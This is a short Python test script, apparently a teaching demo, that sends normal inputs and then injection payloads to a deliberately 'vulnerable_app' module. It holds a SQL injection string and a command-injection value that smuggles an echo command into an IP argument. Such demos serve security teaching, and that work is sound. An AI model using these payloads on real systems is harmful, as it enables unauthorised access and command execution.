import vulnerable_app

print("--- Testing SQL Injection ---")
# A normal request
print("Normal Request:", vulnerable_app.get_user_data("admin"))

# An SQL Injection attack payload
payload = "' OR '1'='1"
print(f"Attack Payload ({payload}):", vulnerable_app.get_user_data(payload))

print("\n--- Testing Command Injection ---")
# A normal request
print("Pinging normal IP:")
vulnerable_app.ping_server("8.8.8.8")

# A Command Injection attack payload (Windows syntax)
attack_ip = "8.8.8.8 & echo YOU HAVE BEEN HACKED!"
print(f"\nPinging attack IP ({attack_ip}):")
vulnerable_app.ping_server(attack_ip)